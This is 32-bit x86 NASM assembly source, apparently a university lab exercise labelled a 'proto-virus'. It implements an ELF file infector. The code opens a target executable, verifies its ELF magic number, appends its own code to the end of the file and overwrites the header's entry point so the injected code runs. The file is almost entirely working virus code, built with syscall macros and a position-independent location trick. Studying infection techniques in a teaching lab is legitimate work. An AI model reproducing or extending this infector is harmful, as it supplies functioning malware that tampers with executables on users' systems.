%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define STDOUT 1

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define	PHDR_vaddr	8
%define EHDR_size 52

global _start

	section .text
_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage


; You code for this lab goes here
call get_my_loc
sub ebx,next_i-OutStr
write STDOUT,ebx,32
call get_my_loc
sub ebx,next_i-FileName
open ebx,RDWR,0777;fd goes to eax
break1:
mov [esp],eax ;put fd in stack
cmp dword[esp],0 ;check if open failed
jl Failed
;CheckELF
mov eax,[esp];put fd in eax
add esp,4;move position after fd in stack
read eax,esp,4
sub esp,4;return to top of stack
cmp dword[esp+4], 0x464c457f ;magic number
jne Failed
;write virus to end of file
mov eax,[esp]
lseek eax,0,SEEK_END
mov eax,[esp]
mov ecx,_start
mov ebx,virus_end;ebx will hold the size of start untill the end
sub ebx,_start
write eax,ecx,ebx

;task1
mov ebx,[esp];move fd to ebx
lseek ebx,0,SEEK_SET;move to the beginning of the file
mov ebx,[esp];move fd to ebx
add esp,8 ;move esp to point after magic numbers
read ebx,esp,EHDR_size
add esp,ENTRY;entry point of ELFexec in out local memory
mov  dword[esp],0x08048294
sub esp,ENTRY;beginning of the elf header in our local memory
lseek ebx,0,SEEK_SET;move to the beginning of the file
mov ebx,[esp-8]
write ebx,esp,EHDR_size
sub esp,8


VirusExit:
break2:
	mov eax,[esp]
	close eax
    exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
Failed:
	mov eax,[esp]
	close eax
	call get_my_loc
	sub ebx,next_i-Failstr
	write STDOUT,ebx,13
	exit 1
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
get_my_loc: 
	call next_i
next_i:
	pop ebx
	ret
PreviousEntryPoint: dd VirusExit
virus_end:


